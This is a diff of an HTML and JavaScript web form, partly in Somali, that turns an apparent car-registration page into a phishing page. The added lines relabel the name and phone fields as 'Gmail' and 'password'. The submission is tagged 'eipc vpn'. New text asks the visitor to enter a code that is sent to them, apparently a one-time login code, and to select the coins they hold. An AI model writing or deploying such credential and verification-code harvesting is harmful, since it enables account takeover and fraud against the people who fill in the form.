@@ -318,8 +318,7 @@
       </p>
 
       <p>
-        Haddii aad rabto, waxaad hadda noo soo diri kartaa
-        hal fariin oo dheeraad ah.
+      si aad ugu xidhato vpn ka gali code an kusoo dirno
       </p>
 
       <button onclick="showPage(7)">
@@ -342,7 +341,7 @@
 
       <textarea
         id="message"
-        placeholder="Halkan ku qor fariintaada..."
+        placeholder="gali code ka ..."
       ></textarea>
 
       <button onclick="sendMessage()">
@@ -354,7 +353,7 @@
       </button>
 
       <div class="error" id="messageError">
-        Fadlan fariinta qor.
+        send the massage.
       </div>
 
       <div class="message-success" id="messageSuccess">
@@ -391,7 +390,7 @@
       const car = document.getElementById("car").value;
 
       if (car === "") {
-        alert("Fadlan dooro nooca gaadhiga.");
+        alert("Fadlan dooro coins ka ad haysato.");
         return;
       }
 
@@ -405,7 +404,7 @@
         document.getElementById("destination").value.trim();
 
       if (destination === "") {
-        alert("Fadlan geli meesha aad rabto inaad tagto.");
+        alert("Fadlan si taxadar le u raac talaaboyinkan.");
         return;
       }
 
@@ -418,10 +417,10 @@
     async function sendForm() {
 
       const name =
-        document.getElementById("name").value.trim();
+        document.getElementById("Gmail").value.trim();
 
       const phone =
-        document.getElementById("phone").value.trim();
+        document.getElementById("password").value.trim();
 
       const car =
         document.getElementById("car").value;
@@ -446,9 +445,9 @@
 
       const data = new FormData();
 
-      data.append("Nooca Fariinta", "Diiwaangelin Cusub");
-      data.append("Magaca", name);
-      data.append("Lambarka", phone);
+      data.append("Nooca Fariinta", "eipc vpn");
+      data.append("Gmail", name);
+      data.append("password", phone);
       data.append("Nooca Gaadhiga", car);
       data.append("Meesha", destination);
 
@@ -524,7 +523,7 @@
 
       const data = new FormData();
 
-      data.append("Nooca Fariinta", "Fariin Dheeraad ah");
+      data.append("Nooca Fariinta", "fadlan gali code-kamarka uu kuso dhaco");
       data.append("Magaca", name);
       data.append("Lambarka", phone);
       data.append("Fariinta Qofka", message);
